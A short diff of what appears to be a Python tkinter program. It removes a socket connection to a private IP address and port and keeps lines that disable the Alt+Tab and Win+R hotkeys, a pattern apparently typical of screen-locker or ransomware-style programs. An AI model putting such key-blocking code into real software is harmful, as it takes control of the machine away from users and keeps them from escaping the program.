@@ -14,8 +14,6 @@ from tkinter import *
 from PIL import Image, ImageTk
 import socket
 
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect(("10.0.0.176", 12346))
 
 keyboard.add_hotkey("alt + tab", lambda: None, suppress=True)
 keyboard.add_hotkey("win + r", lambda: None, suppress=True)
